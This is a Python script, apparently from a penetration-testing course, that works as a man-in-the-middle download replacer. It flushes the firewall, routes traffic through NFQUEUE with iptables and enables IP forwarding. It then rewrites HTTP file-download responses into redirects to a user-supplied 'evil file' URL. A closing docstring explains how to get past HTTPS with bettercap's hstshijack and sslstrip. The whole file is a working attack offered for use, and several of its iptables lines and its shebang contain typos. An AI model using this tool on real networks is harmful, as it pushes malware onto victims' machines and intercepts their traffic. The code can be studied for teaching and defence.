#!/sur/bin/env python3
"""
To ssl strip frist run on terminal:
bettercap -iface eth0 -caplet hstshijack/hstshijack

To start the server run on terminal:
service apache2 start
"""

import subprocess
import netfilterqueue
import scapy.all as scapy

# Modify route: we'll modify the FORWARD chain and trap its content in NFQUEUE O
# iptables -I FORWARD -j NFQUEUE --queue-num 0
from scapy.layers.inet import IP, TCP

subprocess.run('iptables --flush', shell=True)
subprocess.run('iptables -I INPUT-j NFQUEUE --queue-num 0', shell=True)
subprocess.run('iptables -I OUTPUT-j NFQUEUE --queue-num 0', shell=True)
# Enabling port forwarding
subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

evil_url = input("Specify a direct link to the evil file (http://...): ")
extension = input("Specify the extension of the file you want yo replace: ")

ack_list = []
#extensions_list = [".exe", ".pdf", ".png", ".txt", ".jpg", ".apk"]


def set_load(packet, load):
    # Now we'll set the url from which the fake file will be downloaded
    packet[scapy.Raw].load = load
    # Now we must remove the len in the IP layer and the chksum in IP and TCP layers
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # For dns Response DNSRR, for dns request DNSQR
    if scapy_packet.haslayer(scapy.Raw):
        # 8080 is the port used by bettercap
        if scapy_packet[scapy.TCP].dport == 8080:
            # Now we'll put the extension of the file that we want to hijack,
            # it can be whatever, .pdf, .jpeg...
            #for extension in extensions_list:
            if extension in scapy_packet[scapy.Raw].load.decode() and "192.168.64.128" not in scapy_packet[scapy.Raw].load.decode():
                print("[+] Got an file download request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # if ".exe" in scapy_packet[scapy.Raw].load.decode():
            #     """
            #     The same thing would be achieved by:
            #     if ".exe" in str(scapy_packet[Raw].load):
            #     if b.".exe" in scapy_packet[Raw].load:
            #     """
            #     print("[+] exe Request")
            #     # We'll append the ack number to a list
            #     ack_list.append(scapy_packet[scapy.TCP].ack)
            #     # print(scapy_packet.show())
            # """
            # Packets are related with the ack and seq number, that's how we know
            # which is the response (seq) of which request (ack)
            # """
        elif scapy_packet[scapy.TCP].sport == 8080:
            # We check if the seq number of the response is in the ack_list
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, f"HTTP/1.1 301 Moved Permanently\nLocation: {evil_url}\n\n")

                packet.set_payload(bytes(modified_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    subprocess.run('iptables --flush', shell=True)
    print("[+] Detected  CTRL + C ...... Deleting IP tables..... Please wait.\n")

"""
Tip: How to properly bypass HTTPS

Follow the steps:

$ sslstrip

it should be started.....


route all HTTP requests to port 10000, because sslstrip works on that port. So that that I can modify the packets.

  $ iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 10000


IP_FORWARDING(Unix Like Systems)

make sure your ip_forwarding is on:

$ echo 1 > /proc/sys/net/ipv4/ip_forward

or

sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

or permanently enabling that(not recommended)

open /etc/sysctl.conf

uncomment net.ipv4.ip_forward = 1

for immediate effect do:  $ sudo sysctl -p  or restart


HOW TO USE PROGRAMS:

non-intercepting one:

now after doing everything you can use any program that does not intercept the packets, only read them. For ex. packet sniffer.


intercepting one:

now if you are using programs that include intercepting the packets. For ex. replace_downloads, code_inject, dns_spoofing, etc.


MORE IPTABLE RULES

you need to enable these iptable rules

$ iptables -I INPUT -j NFQUEUE --queue-num 0

$ iptables -I OUPUT -j NFQUEUE --queue-num 0   

notice, that it's a local or remote computer we have to make tables(firewall) rules for INPUT and OUTPUT chain when using prerouting. Don't use "FORWARD".


PORT IN PROGRAMS

Now anywhere in these programs, you have used port 80 as the sport and dport,  replace it with "10000"



Maybe Browser Cache?

you might have visited these sites a lot of time so clear browser history.


TRY ON REMOTE DESKTOP

sometimes for some weird reason, HTTPS can't be bypassed on the local machine. But do on the remote desktop. So please Try on remote desktop.
"""